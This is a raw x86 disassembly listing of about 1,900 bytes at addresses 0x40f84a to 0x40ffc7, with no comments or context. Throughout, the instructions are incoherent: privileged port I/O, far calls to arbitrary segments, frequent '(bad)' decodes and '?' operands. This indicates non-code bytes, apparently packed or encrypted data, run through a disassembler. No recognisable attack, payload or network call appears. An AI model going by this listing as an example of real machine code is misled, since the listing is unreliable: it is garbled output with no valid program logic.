  40f84a:	add    BYTE PTR [edx+eiz*2],bl
  40f84d:	xor    DWORD PTR [ecx],eax
  40f84f:	mov    cl,BYTE PTR [eax+ecx*4]
  40f852:	xor    edi,DWORD PTR [edx-0x45b7a474]
  40f858:	in     eax,dx
  40f859:	adc    DWORD PTR [ebx+0x56ef6e54],edx
  40f85f:	mov    ecx,0xb009a702
  40f864:	xor    al,0x13
  40f866:	sahf   
  40f867:	push   ecx
  40f868:	xchg   esp,eax
  40f869:	iret   
  40f86a:	cmp    al,0x82
  40f86c:	dec    esi
  40f86d:	clc    
  40f86e:	not    BYTE PTR [eax+0x18]
  40f871:	add    DWORD PTR [ecx],esi
  40f873:	or     edi,DWORD PTR [eax+0x3a]
  40f876:	cmp    esp,DWORD PTR [ebx]
  40f878:	xor    bl,dl
  40f87a:	pop    ss
  40f87b:	mov    ch,0x70
  40f87d:	and    BYTE PTR [ebx-0x7bb33d5f],bh
  40f883:	adc    BYTE PTR [edx],ah
  40f885:	arpl   WORD PTR [esi-0x3b],di
  40f888:	jmp    0x40f812
  40f88a:	cmp    dl,BYTE PTR [ecx]
  40f88c:	and    ah,BYTE PTR [eax]
  40f88e:	sbb    al,0x4b
  40f890:	repz inc ebp
  40f892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f893:	dec    edi
  40f894:	jecxz  0x40f8f5
  40f896:	adc    cl,BYTE PTR [eax+0x35]
  40f899:	cmc    
  40f89a:	inc    esi
  40f89b:	aam    0xbc
  40f89d:	pop    ebp
  40f89e:	fisub  WORD PTR [ecx+esi*1]
  40f8a1:	xchg   ebx,eax
  40f8a2:	push   0x1ef9930b
  40f8a7:	out    dx,eax
  40f8a8:	aas    
  40f8a9:	xchg   edx,eax
  40f8aa:	bound  esi,QWORD PTR [edx-0x25f6a247]
  40f8b0:	bndcn  bnd1,[edx-0x38c78280]
  40f8b8:	jmp    0x40f89d
  40f8ba:	retf   0x2266
  40f8bd:	stos   DWORD PTR es:[edi],eax
  40f8be:	adc    eax,0xb3535804
  40f8c3:	push   esp
  40f8c4:	xor    al,0xca
  40f8c6:	xchg   ebx,eax
  40f8c7:	pop    ecx
  40f8c8:	pop    esi
  40f8c9:	inc    esp
  40f8ca:	pusha  
  40f8cb:	sub    eax,0x23b4fc62
  40f8d0:	push   ds
  40f8d1:	sbb    eax,0x3d3af910
  40f8d6:	add    al,0x7b
  40f8d8:	cmp    ecx,eax
  40f8da:	push   0x2d
  40f8dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8dd:	retf   
  40f8de:	mov    ?,ebp
  40f8e0:	sub    eax,0x9ae1a136
  40f8e5:	fst    DWORD PTR [ebx-0x6c]
  40f8e8:	and    cl,al
  40f8ea:	out    0x2c,al
  40f8ec:	inc    ebp
  40f8ed:	jge    0x40f95f
  40f8ef:	aas    
  40f8f0:	mov    WORD PTR [ebp+0x250efb0c],?
  40f8f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8f7:	mov    ds:0x536e8c76,al
  40f8fc:	call   0x8e70:0xa1f8b083
  40f903:	mov    WORD PTR [bp-0x7b9c],gs
  40f908:	xor    eax,0xb9be3aff
  40f90d:	popf   
  40f90e:	enter  0xbb64,0xb2
  40f912:	cdq    
  40f913:	mov    ecx,0xa363190c
  40f918:	cwde   
  40f919:	inc    eax
  40f91a:	push   0xb298bf04
  40f91f:	dec    eax
  40f920:	ja     0x40f94a
  40f922:	fwait
  40f923:	popf   
  40f924:	mov    ch,0x87
  40f926:	(bad)  
  40f927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f928:	pop    ecx
  40f929:	je     0x40f8e4
  40f92b:	in     al,dx
  40f92c:	xchg   esp,eax
  40f92e:	je     0x40f8c2
  40f930:	or     eax,0x5744d3ce
  40f935:	or     DWORD PTR [edx-0x2845e845],ecx
  40f93b:	lods   al,BYTE PTR ds:[esi]
  40f93c:	pop    esp
  40f93d:	jmp    0xdea49d72
  40f942:	enter  0xd9be,0xf1
  40f946:	or     cl,BYTE PTR [ecx-0x15]
  40f949:	dec    edx
  40f94a:	test   eax,0xb3e26fb5
  40f94f:	cwde   
  40f950:	sar    DWORD PTR [edi+0x255380a7],cl
  40f956:	xor    edi,DWORD PTR [bp+di+0x120b]
  40f95b:	xlat   BYTE PTR ds:[ebx]
  40f95c:	mov    fs:0x7f4846fc,al
  40f962:	sbb    dl,BYTE PTR [ecx+eax*2-0x7d]
  40f966:	mov    al,0xc
  40f968:	jnp    0x40f94c
  40f96a:	out    0xf7,eax
  40f96c:	aam    0x8b
  40f96e:	aaa    
  40f96f:	aaa    
  40f970:	or     edx,DWORD PTR [esi+0x2d]
  40f973:	pop    ss
  40f974:	sbb    ebp,eax
  40f976:	cmp    DWORD PTR [ebx+0x4fcb5b19],ebp
  40f97c:	int    0xad
  40f97e:	call   0x5bae:0x161e6ef7
  40f985:	in     eax,dx
  40f986:	sbb    BYTE PTR [edi+0x1c],0x3c
  40f98a:	(bad)  
  40f98b:	ret    
  40f98c:	push   cs
  40f98d:	dec    eax
  40f98e:	test   edx,esi
  40f990:	mov    dl,0x1b
  40f992:	bound  eax,QWORD PTR [ebp+eiz*2+0x72]
  40f996:	push   ss
  40f997:	and    al,BYTE PTR [eax-0x492866a]
  40f99d:	stos   DWORD PTR es:[edi],eax
  40f99e:	xor    cl,bl
  40f9a0:	call   0xeb55:0x4c7e0cc6
  40f9a7:	push   es
  40f9a8:	jge    0x40fa01
  40f9aa:	mov    dh,0xf7
  40f9ac:	or     bh,dh
  40f9ae:	aas    
  40f9af:	(bad)  
  40f9b0:	mov    esp,0x47f5b8d6
  40f9b5:	hlt    
  40f9b6:	pop    ss
  40f9b7:	aaa    
  40f9b8:	aam    0xac
  40f9ba:	repnz sbb edi,eax
  40f9bd:	cmp    ah,BYTE PTR [edi+0x55cc3add]
  40f9c3:	shr    BYTE PTR [ecx+0x73dc75bb],0x98
  40f9ca:	mov    bh,0x7d
  40f9cc:	xchg   edx,eax
  40f9cd:	sub    BYTE PTR [edi-0x66d68f4a],dl
  40f9d3:	jne    0x40f9f2
  40f9d5:	mov    edi,0x212dc628
  40f9da:	xchg   esi,eax
  40f9db:	lock sub eax,DWORD PTR [esi+0x322264df]
  40f9e2:	stc    
  40f9e3:	jnp    0x40f9ce
  40f9e5:	test   BYTE PTR [edx+eax*8+0x5e],ch
  40f9e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9ea:	mov    es,ecx
  40f9ec:	pop    ebx
  40f9ed:	inc    eax
  40f9ee:	jns    0x40fa49
  40f9f0:	add    edx,ebp
  40f9f2:	mov    al,ds:0x50dd8105
  40f9f7:	leave  
  40f9f8:	adc    BYTE PTR [esi],dh
  40f9fa:	add    al,0x57
  40f9fc:	mov    bl,0x79
  40f9fe:	inc    edx
  40f9ff:	and    BYTE PTR [edx+esi*8-0x66],al
  40fa03:	xor    cl,cl
  40fa05:	adc    dh,BYTE PTR ds:0xbc2aa7fd
  40fa0b:	jb     0x40fa89
  40fa0d:	mov    bl,0x19
  40fa0f:	xor    eax,0x429c3836
  40fa14:	pop    es
  40fa15:	sub    BYTE PTR [ebx+ebx*1-0x1d196c75],ch
  40fa1c:	les    edx,FWORD PTR [esi+0x63]
  40fa1f:	test   DWORD PTR [edx-0x321d8745],esi
  40fa25:	imul   ebp,DWORD PTR [ecx-0x78],0xe1748d64
  40fa2c:	or     eax,0x79a108fd
  40fa31:	push   cs
  40fa32:	jecxz  0x40fa41
  40fa34:	xchg   esi,eax
  40fa35:	cmp    DWORD PTR [ebx],eax
  40fa37:	inc    ebx
  40fa38:	push   eax
  40fa39:	stos   DWORD PTR es:[edi],eax
  40fa3a:	not    BYTE PTR [ecx+0x267a7acf]
  40fa40:	sar    BYTE PTR es:[esi+edx*4],cl
  40fa44:	and    al,0x51
  40fa46:	dec    BYTE PTR [ebp+0x74]
  40fa49:	ret    0x419f
  40fa4c:	or     eax,0xd5db9f96
  40fa51:	dec    ecx
  40fa52:	jmp    0x40f9e1
  40fa54:	push   ds
  40fa55:	sub    ebp,DWORD PTR [ecx+0x7d842c85]
  40fa5b:	jae    0x40fab8
  40fa5d:	mov    dl,0x9b
  40fa5f:	dec    ebp
  40fa60:	add    al,0xbe
  40fa62:	push   ds
  40fa63:	and    eax,0xf9bf9e3a
  40fa68:	shr    bh,1
  40fa6a:	hlt    
  40fa6b:	ror    BYTE PTR [ebp-0x123c4dda],0xa2
  40fa72:	mov    cl,0xde
  40fa74:	sub    al,BYTE PTR [ebx]
  40fa76:	pop    esi
  40fa77:	dec    ecx
  40fa78:	mov    ch,BYTE PTR [edi]
  40fa7a:	xor    DWORD PTR [edi-0x9b9b2f7],ebp
  40fa80:	jns    0x40faa3
  40fa82:	int    0x22
  40fa84:	outs   dx,DWORD PTR ds:[esi]
  40fa85:	test   DWORD PTR [ebx+0xc],esp
  40fa88:	aas    
  40fa89:	push   esi
  40fa8a:	loop   0x40fa1d
  40fa8c:	jne    0x40fab2
  40fa8e:	cmp    esp,DWORD PTR [ebp-0x21bfe4f8]
  40fa94:	fsub   QWORD PTR [edi+0x42]
  40fa97:	leave  
  40fa98:	mov    ?,WORD PTR [esp+edi*2+0x1fe7324a]
  40fa9f:	xchg   edx,eax
  40faa0:	ds sbb al,0x56
  40faa3:	mov    edi,0x2f2b479a
  40faa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faa9:	mov    dh,0xc9
  40faab:	jne    0x40fa6c
  40faad:	fsubr  QWORD PTR [edx-0x39]
  40fab0:	std    
  40fab1:	push   0xefb8d99a
  40fab6:	leave  
  40fab7:	jmp    0xb543:0x4c2e2ea
  40fabe:	and    ebx,DWORD PTR [ebx]
  40fac0:	mov    al,ds:0xd77d247a
  40fac5:	sub    eax,0x596270cd
  40faca:	inc    ebp
  40facb:	jb     0x40fa76
  40facd:	cli    
  40face:	push   edi
  40facf:	sahf   
  40fad0:	inc    eax
  40fad1:	cld    
  40fad2:	iret   
  40fad3:	cmp    eax,0xaa994b54
  40fad8:	rcr    BYTE PTR [edx],1
  40fada:	lods   eax,DWORD PTR ds:[esi]
  40fadb:	neg    BYTE PTR [esi]
  40fadd:	xor    al,0xda
  40fadf:	dec    ebp
  40fae0:	std    
  40fae1:	or     BYTE PTR [ecx+0x36],0x31
  40fae5:	bound  edi,QWORD PTR [edx+0x7b]
  40fae8:	cmp    DWORD PTR [esi+0x4c],eax
  40faeb:	loop   0x40fa7c
  40faed:	mov    bl,0xaa
  40faef:	adc    ch,BYTE PTR es:[edx+0x3a98dcd9]
  40faf6:	jge    0x40fb76
  40faf8:	shr    BYTE PTR [esi],0xb8
  40fafb:	cld    
  40fafc:	test   eax,0x59f0d0cd
  40fb01:	(bad)  
  40fb02:	enter  0x67a4,0x5f
  40fb06:	les    esp,FWORD PTR [eax]
  40fb08:	popa   
  40fb09:	xchg   ebp,eax
  40fb0a:	mov    dh,0xf2
  40fb0c:	cli    
  40fb0d:	jb     0x40faaa
  40fb0f:	dec    edx
  40fb10:	iret   
  40fb11:	mov    eax,ds:0x38585321
  40fb16:	and    bl,ch
  40fb18:	push   ds
  40fb19:	in     al,0x7b
  40fb1b:	les    ecx,FWORD PTR [eax]
  40fb1d:	or     al,0xd5
  40fb1f:	iret   
  40fb20:	(bad)  
  40fb21:	jae    0x40faf3
  40fb23:	shl    al,1
  40fb25:	mov    edi,0x76e17c9f
  40fb2a:	inc    ecx
  40fb2b:	lock (bad) 
  40fb2d:	mov    al,ds:0x7394287a
  40fb32:	mov    al,ds:0x70cad675
  40fb37:	add    DWORD PTR [esi-0x3e],0xfffffffc
  40fb3b:	pusha  
  40fb3c:	ins    BYTE PTR es:[edi],dx
  40fb3d:	lods   al,BYTE PTR ds:[esi]
  40fb3e:	pop    esi
  40fb3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb40:	mov    ah,0x2c
  40fb42:	ss or  ah,0x43
  40fb46:	jecxz  0x40fb84
  40fb48:	cmp    ebp,DWORD PTR [ebp-0x7c]
  40fb4b:	jbe    0x40fb36
  40fb4d:	or     BYTE PTR [ebp-0x50f2178a],cl
  40fb53:	cmp    edx,ebx
  40fb55:	jo     0x40faeb
  40fb57:	call   0xa7236f7d
  40fb5c:	push   esi
  40fb5d:	pop    ds
  40fb5e:	sbb    bl,BYTE PTR [ebp+0x2b]
  40fb61:	popa   
  40fb62:	or     dh,bh
  40fb64:	mov    bh,0x95
  40fb66:	mov    dl,0x82
  40fb68:	or     eax,0x29516da6
  40fb6d:	lods   al,BYTE PTR ds:[esi]
  40fb6e:	inc    esp
  40fb6f:	add    al,0x1a
  40fb71:	mov    edi,0xa9273ce6
  40fb76:	mov    ds:0x7a64f8c4,al
  40fb7b:	jl     0x40fb8c
  40fb7d:	xchg   edi,eax
  40fb7e:	push   esi
  40fb7f:	mov    cs,WORD PTR [ebx+0x182a5e8a]
  40fb85:	jnp    0x40fb47
  40fb87:	es std 
  40fb89:	pop    edx
  40fb8a:	and    BYTE PTR [esi-0x2d1bf8a6],dl
  40fb90:	or     BYTE PTR [eax-0xc58ca71],0x67
  40fb97:	adc    eax,DWORD PTR [ebx-0x1f]
  40fb9a:	rcl    DWORD PTR [esi],cl
  40fb9c:	cmp    eax,0x247ab56b
  40fba1:	xchg   BYTE PTR [eax+0x8],bh
  40fba4:	call   0xd123:0x1868f82a
  40fbab:	pop    edi
  40fbac:	pop    ecx
  40fbad:	aaa    
  40fbae:	in     eax,dx
  40fbaf:	imul   ebx,DWORD PTR [ecx-0x25],0xffffff81
  40fbb3:	xchg   DWORD PTR [ebp+0x674a4539],ecx
  40fbb9:	sub    DWORD PTR [eax],esp
  40fbbb:	mov    eax,0x3a49a92f
  40fbc0:	std    
  40fbc1:	(bad)  
  40fbc2:	hlt    
  40fbc3:	aad    0x82
  40fbc5:	jp     0x40fc34
  40fbc7:	xor    eax,0xb1624be1
  40fbcc:	push   cs
  40fbcd:	pusha  
  40fbce:	dec    edi
  40fbcf:	or     al,0xa2
  40fbd1:	ins    DWORD PTR es:[edi],dx
  40fbd2:	adc    eax,0xb3da7d5e
  40fbd7:	xor    BYTE PTR [ebx+0x7f],bh
  40fbda:	xchg   esi,eax
  40fbdb:	hlt    
  40fbdc:	mov    ebp,0xb4f602b8
  40fbe1:	sub    bl,0xe9
  40fbe4:	adc    eax,0xccf9b796
  40fbe9:	inc    esp
  40fbea:	(bad)
  40fbee:	outs   dx,BYTE PTR ds:[esi]
  40fbef:	mov    ecx,ss
  40fbf1:	mov    dh,0x5
  40fbf3:	das    
  40fbf4:	stc    
  40fbf5:	leave  
  40fbf6:	pop    ss
  40fbf7:	lods   al,BYTE PTR ds:[esi]
  40fbf8:	gs je  0x40fbce
  40fbfb:	add    BYTE PTR [edi-0x62],0x8c
  40fbff:	sbb    BYTE PTR [ebp-0x67],bl
  40fc02:	mov    dh,0x80
  40fc04:	mov    dh,al
  40fc06:	adc    bl,bh
  40fc08:	idiv   BYTE PTR [edx+0x36a31e0d]
  40fc0e:	mov    al,ds:0xb0baad68
  40fc13:	push   edx
  40fc14:	test   DWORD PTR [eax-0x4ba4f3e3],edx
  40fc1a:	pop    ebp
  40fc1b:	dec    ebx
  40fc1c:	les    ebx,FWORD PTR [esi-0x6acc0b77]
  40fc22:	push   esp
  40fc23:	or     eax,0x87748535
  40fc28:	cdq    
  40fc29:	imul   esi,ebp,0xfffffff7
  40fc2c:	loop   0x40fc85
  40fc2e:	enter  0xa2e6,0x59
  40fc32:	add    cl,BYTE PTR [eax-0x105b08f1]
  40fc38:	and    dl,BYTE PTR [esi-0xe2e86b]
  40fc3e:	add    al,0x7b
  40fc40:	dec    ecx
  40fc41:	pop    ss
  40fc42:	xor    BYTE PTR [edi-0x76024084],cl
  40fc48:	ret    0xbb6b
  40fc4b:	dec    esp
  40fc4c:	sub    BYTE PTR [esi+0x54],dl
  40fc4f:	sub    cl,BYTE PTR [ebx+0x64f42027]
  40fc55:	sar    DWORD PTR [ebx+0x39],1
  40fc58:	pop    ebp
  40fc59:	and    edx,edx
  40fc5b:	add    eax,0x8baf1e3a
  40fc60:	dec    ebp
  40fc61:	and    DWORD PTR [esi-0x45],edx
  40fc64:	inc    esi
  40fc65:	lds    ebp,FWORD PTR [edx+0xd]
  40fc68:	sub    dl,bh
  40fc6a:	in     al,dx
  40fc6b:	pop    ebx
  40fc6c:	test   DWORD PTR [esp+ecx*1+0x30],esi
  40fc70:	dec    edi
  40fc71:	pop    edi
  40fc72:	cld    
  40fc73:	xchg   edx,eax
  40fc74:	push   ebx
  40fc75:	cmp    esi,DWORD PTR ds:0x8f2fdb33
  40fc7b:	jnp    0x40fc2d
  40fc7d:	enter  0x98bc,0x75
  40fc81:	xchg   DWORD PTR [edx+0x6c],ebp
  40fc84:	mov    ch,0xba
  40fc86:	mov    edx,0xe44f45aa
  40fc8b:	mov    eax,ds:0x5702c816
  40fc90:	mov    al,ds:0x8a4bdb0e
  40fc95:	xchg   esi,eax
  40fc96:	cmp    al,0x8
  40fc98:	ins    DWORD PTR es:[edi],dx
  40fc99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc9a:	cmp    eax,esp
  40fc9c:	jmp    0x428f:0x3c56
  40fca2:	int    0x6c
  40fca4:	(bad)  
  40fca5:	pop    ss
  40fca6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fca7:	xchg   edx,eax
  40fca8:	fwait
  40fca9:	jg     0x40fcd3
  40fcab:	int3   
  40fcac:	test   BYTE PTR [ebx],al
  40fcae:	xlat   BYTE PTR ds:[ebx]
  40fcaf:	aas    
  40fcb0:	test   DWORD PTR [ebx+0x13553b27],0x4abd0ecb
  40fcba:	xor    ebx,DWORD PTR [edi+0x2135a9ea]
  40fcc0:	xor    edi,eax
  40fcc2:	sub    al,0x86
  40fcc4:	adc    DWORD PTR [esi+edi*4-0x4c045bbc],ebp
  40fccb:	add    ebx,DWORD PTR ds:0x23425096
  40fcd1:	outs   dx,BYTE PTR ds:[esi]
  40fcd2:	dec    eax
  40fcd3:	add    ah,ch
  40fcd5:	jns    0x40fcc8
  40fcd7:	outs   dx,BYTE PTR ds:[esi]
  40fcd8:	pop    esi
  40fcd9:	sbb    ah,BYTE PTR [edi]
  40fcdb:	and    DWORD PTR [ecx-0x3fb33b00],0xc467f3a
  40fce5:	fcomp  QWORD PTR ds:0x3ff7ca82
  40fceb:	loope  0x40fd16
  40fced:	aam    0xb
  40fcef:	mov    WORD PTR [ebp-0x5],es
  40fcf2:	cmp    BYTE PTR [esp+eiz*2],al
  40fcf5:	xchg   edx,eax
  40fcf6:	mov    ebp,0xa3b866e8
  40fcfb:	pop    eax
  40fcfc:	push   esp
  40fcfd:	mov    ecx,0x6f832f5c
  40fd02:	xchg   al,bh
  40fd04:	push   esp
  40fd05:	adc    DWORD PTR [edx+eiz*1-0x45],esp
  40fd09:	(bad)  
  40fd0a:	dec    ebp
  40fd0b:	jecxz  0x40fd62
  40fd0d:	mov    ecx,0xd26da075
  40fd12:	test   al,0xc
  40fd14:	repz mov al,0x1e
  40fd17:	jb     0x40fd72
  40fd19:	pop    ebp
  40fd1a:	or     al,0x7
  40fd1c:	sahf   
  40fd1d:	dec    esp
  40fd1e:	loope  0x40fcfa
  40fd20:	add    esp,DWORD PTR [ebp+0x166313a4]
  40fd26:	push   ds
  40fd27:	cli    
  40fd28:	xlat   BYTE PTR ds:[ebx]
  40fd29:	fiadd  WORD PTR [edi+0x34e1b00d]
  40fd2f:	std    
  40fd30:	loop   0x40fd54
  40fd32:	(bad)  
  40fd33:	cmovae ecx,DWORD PTR [ebx+0x4b]
  40fd37:	shr    BYTE PTR [esp+ecx*2-0x10],0x29
  40fd3c:	(bad)  
  40fd3d:	outs   dx,BYTE PTR ds:[esi]
  40fd3e:	xor    esi,DWORD PTR [ebx-0x20fb37ce]
  40fd44:	out    dx,eax
  40fd45:	cmp    bh,BYTE PTR [ebp+0x3d08eac9]
  40fd4b:	in     al,dx
  40fd4c:	and    BYTE PTR [esi+0x2e0ff87a],cl
  40fd52:	gs pop ebx
  40fd54:	mov    bl,0x2
  40fd56:	sti    
  40fd57:	xlat   BYTE PTR ds:[ebx]
  40fd58:	and    eax,0xdc513207
  40fd5d:	dec    esp
  40fd5e:	dec    bl
  40fd60:	push   ecx
  40fd61:	dec    esp
  40fd62:	sub    eax,DWORD PTR [esi+eiz*2]
  40fd65:	rol    DWORD PTR [ecx],0xc1
  40fd68:	ins    BYTE PTR es:[edi],dx
  40fd69:	mov    ebx,DWORD PTR [ebp+0x3b1b8977]
  40fd6f:	lds    ecx,FWORD PTR [ebp-0x6]
  40fd72:	sahf   
  40fd73:	sti    
  40fd74:	or     edi,DWORD PTR [edx-0x7d]
  40fd77:	cmc    
  40fd78:	and    eax,0xe9a84c86
  40fd7d:	(bad)  
  40fd7e:	add    esi,edx
  40fd80:	fs xor edi,edx
  40fd83:	mov    fs,ebp
  40fd85:	jns    0x40fdf0
  40fd87:	pop    eax
  40fd89:	popf   
  40fd8a:	or     eax,0x41dfe0bf
  40fd8f:	jl     0x40fd60
  40fd91:	add    ebp,DWORD PTR [ebp+0x7881e217]
  40fd97:	mov    edi,0x80967d8c
  40fd9c:	jns    0x40fd3d
  40fd9e:	cs imul ebx,esi,0x21
  40fda2:	(bad)  
  40fda3:	push   es
  40fda4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fda5:	repnz in eax,0x43
  40fda8:	rcl    DWORD PTR ds:[ecx+0xd2763a2],1
  40fdaf:	test   bl,dl
  40fdb1:	mov    esi,0x11fd743d
  40fdb6:	mov    edi,DWORD PTR [edx+0x5706aeeb]
  40fdbc:	int    0x2
  40fdbe:	and    eax,0x11ba6946
  40fdc3:	lahf   
  40fdc4:	xor    DWORD PTR [bp+si+0x3e56],ecx
  40fdc9:	retf   0x83ab
  40fdcc:	push   ecx
  40fdcd:	sbb    BYTE PTR [ecx+0x63a37ec9],ah
  40fdd3:	jmp    0x3e356c6a
  40fdd8:	lahf   
  40fdd9:	dec    esi
  40fdda:	xchg   DWORD PTR [ecx+0x5b918077],esp
  40fde0:	int3   
  40fde1:	rcl    BYTE PTR [esi-0x7942e198],1
  40fde7:	cli    
  40fde8:	jle    0x40fdae
  40fdea:	push   es
  40fdeb:	out    0xb9,al
  40fded:	jl     0x40fdcc
  40fdef:	or     edi,DWORD PTR [ecx-0x7114bab4]
  40fdf5:	push   edi
  40fdf6:	fwait
  40fdf7:	push   eax
  40fdf8:	into   
  40fdf9:	jmp    0x40fdab
  40fdfb:	mov    BYTE PTR [ecx+0x24],ah
  40fdfe:	dec    ebp
  40fdff:	mov    ds:0xc7db7b58,eax
  40fe04:	mov    bh,dh
  40fe06:	adc    eax,eax
  40fe08:	jbe    0x40fdba
  40fe0a:	sbb    ecx,DWORD PTR [edx+0x3b3b50e4]
  40fe10:	or     cl,BYTE PTR [esi+0x58]
  40fe13:	jns    0x40fdb9
  40fe15:	mov    dl,0xae
  40fe17:	add    al,0xd6
  40fe19:	xor    esp,esi
  40fe1b:	mov    ss,esp
  40fe1d:	jg     0x40fe99
  40fe1f:	pop    ecx
  40fe20:	aam    0x12
  40fe22:	inc    esp
  40fe23:	jl     0x40fe9b
  40fe25:	sub    eax,0x701ce72a
  40fe2a:	std    
  40fe2b:	inc    esi
  40fe2c:	test   al,0xc5
  40fe2e:	xor    eax,0xadf7b83e
  40fe33:	xor    dh,ah
  40fe35:	inc    esi
  40fe36:	cwde   
  40fe37:	clc    
  40fe38:	rcl    BYTE PTR ds:0x19ba6b47,0x7
  40fe3f:	or     al,0xe2
  40fe41:	(bad)  ds:0x47e767
  40fe47:	jae    0x40fe9d
  40fe49:	aas    
  40fe4a:	xchg   ebx,eax
  40fe4b:	cmp    eax,0x212bffc3
  40fe50:	xlat   BYTE PTR ds:[ebx]
  40fe51:	loopne 0x40fe8f
  40fe53:	xor    BYTE PTR [edx-0x52],0xa9
  40fe57:	xchg   esp,eax
  40fe58:	and    ah,BYTE PTR [esp+eax*4]
  40fe5b:	shl    ebp,cl
  40fe5d:	ja     0x40fea7
  40fe5f:	inc    edx
  40fe60:	mov    eax,0x10edafa4
  40fe65:	repz pop ebp
  40fe67:	or     BYTE PTR [esi],bl
  40fe69:	out    dx,al
  40fe6a:	lock ret 
  40fe6c:	mov    dl,0x93
  40fe6e:	jo     0x40fe8d
  40fe70:	dec    edi
  40fe71:	push   ebp
  40fe72:	das    
  40fe73:	cmp    DWORD PTR [edi-0x6e731de0],edx
  40fe79:	pop    DWORD PTR [ebx+0x68]
  40fe7c:	int    0xa
  40fe7e:	jbe    0x40fef2
  40fe80:	mov    ch,cl
  40fe82:	push   esp
  40fe83:	cmp    eax,0xd5608741
  40fe88:	mov    esp,0x55351591
  40fe8d:	retf   0x1a6f
  40fe90:	or     al,0x4e
  40fe92:	imul   edx,DWORD PTR [eax],0x8e20f738
  40fe98:	jae    0x40fe41
  40fe9a:	or     al,0xeb
  40fe9c:	loope  0x40fef6
  40fe9e:	enter  0x3f75,0x60
  40fea2:	adc    eax,0x98f3d7ea
  40fea7:	pop    es
  40fea8:	inc    ebp
  40fea9:	dec    ebx
  40feaa:	mov    ds:0x457520d6,ax
  40feb0:	das    
  40feb1:	call   0xe0c:0xd1a14271
  40feb8:	(bad)  
  40feb9:	aaa    
  40feba:	dec    eax
  40febb:	jl     0x40fe76
  40febd:	jg     0x40fef5
  40febf:	icebp  
  40fec0:	push   es
  40fec1:	fstp   st(2)
  40fec3:	repnz (bad) 
  40fec5:	xor    eax,DWORD PTR [esi+0x57fb838a]
  40fecb:	test   edi,ecx
  40fecd:	fadd   DWORD PTR [esi+edi*2-0x4]
  40fed1:	fistp  DWORD PTR [ebp+0x37]
  40fed4:	imul   ebx,DWORD PTR [edx+ebp*8],0x30
  40fed8:	dec    ecx
  40fed9:	fimul  DWORD PTR [edx-0x64f480e8]
  40fedf:	sub    al,0x90
  40fee1:	repnz fnstenv [ebp-0x697c5472]
  40fee8:	cmp    BYTE PTR [edi+0x8bf31bb],ah
  40feee:	jb     0x40ff3f
  40fef0:	loopne 0x40ff52
  40fef2:	and    eax,0xe9fb4e8f
  40fef7:	cwde   
  40fef8:	mov    esp,0xf9b03d6c
  40fefd:	and    al,0xad
  40feff:	push   cs
  40ff00:	test   esi,0x9b1e3e9
  40ff06:	push   esi
  40ff07:	out    0xc0,al
  40ff09:	in     al,dx
  40ff0a:	jle    0x40fedf
  40ff0c:	jb     0x40fe90
  40ff0e:	fadd   QWORD PTR [edi+0x4a]
  40ff11:	repz xor esp,DWORD PTR [esp+ecx*2]
  40ff15:	js     0x40ff16
  40ff17:	push   edi
  40ff18:	push   edi
  40ff19:	out    dx,eax
  40ff1a:	mov    al,0xfc
  40ff1c:	jno    0x40feed
  40ff1e:	add    BYTE PTR [esi+ecx*2+0x707b8e7],bl
  40ff25:	(bad)  
  40ff26:	lods   eax,DWORD PTR ds:[esi]
  40ff27:	(bad)  
  40ff28:	in     al,dx
  40ff29:	bound  esp,QWORD PTR [ecx+eiz*4]
  40ff2c:	sbb    BYTE PTR [ebx+esi*1+0x561c682b],0x49
  40ff34:	repnz repnz xchg edi,eax
  40ff37:	mov    al,0x8d
  40ff39:	jno    0x40ff42
  40ff3b:	in     al,dx
  40ff3c:	xor    DWORD PTR [ebp+0x37f05290],esp
  40ff42:	loopne 0x40fec5
  40ff44:	aas    
  40ff45:	push   edx
  40ff46:	test   BYTE PTR [edx],dl
  40ff48:	xchg   edx,eax
  40ff49:	mov    bl,0x35
  40ff4b:	pop    ebp
  40ff4c:	xchg   ebp,eax
  40ff4d:	(bad)  
  40ff4f:	and    edx,DWORD PTR [esi]
  40ff51:	daa    
  40ff52:	inc    edi
  40ff53:	mov    ch,0x8f
  40ff55:	xor    esi,esp
  40ff57:	(bad)  
  40ff59:	jns    0x40ff3c
  40ff5b:	(bad)  
  40ff5c:	mov    ebx,ecx
  40ff5e:	sub    DWORD PTR [ecx],esi
  40ff60:	sti    
  40ff61:	add    edi,ecx
  40ff63:	adc    al,0x5c
  40ff65:	sar    BYTE PTR [ebx],cl
  40ff67:	add    DWORD PTR [esi+0x5d],ecx
  40ff6a:	pop    ds
  40ff6b:	lahf   
  40ff6c:	sti    
  40ff6d:	jecxz  0x40ff89
  40ff6f:	or     ch,BYTE PTR [edx-0x35580fb6]
  40ff75:	mov    ss,eax
  40ff77:	and    al,0xd4
  40ff79:	in     eax,dx
  40ff7a:	pop    es
  40ff7b:	sub    ebx,DWORD PTR [ebx+edi*4]
  40ff7e:	loopne 0x40ff0d
  40ff80:	sub    ecx,DWORD PTR [eax+0x4e]
  40ff83:	sub    eax,0x8068cbb
  40ff88:	jmp    0x40ffd4
  40ff8a:	sbb    dl,BYTE PTR [edx]
  40ff8c:	mov    cs,WORD PTR [edx+eiz*4-0x1b7be89a]
  40ff93:	inc    ebp
  40ff94:	adc    BYTE PTR [esp+ecx*2+0x6b4048e],cl
  40ff9b:	call   0x57d74c82
  40ffa0:	call   0x7245:0x3edeada8
  40ffa7:	test   DWORD PTR [eax],edi
  40ffa9:	mov    ds:0x40a0574c,al
  40ffae:	jmp    0x9c29:0xfbbaee0e
  40ffb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffb6:	stos   DWORD PTR es:[edi],eax
  40ffb7:	xchg   BYTE PTR [eax-0x3a],al
  40ffba:	sub    eax,0xfb4663bc
  40ffbf:	dec    BYTE PTR [ebp+0x3b]
  40ffc2:	sub    BYTE PTR [edi+ecx*1+0x15],ah
  40ffc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffc7:	xchg   edi,eax
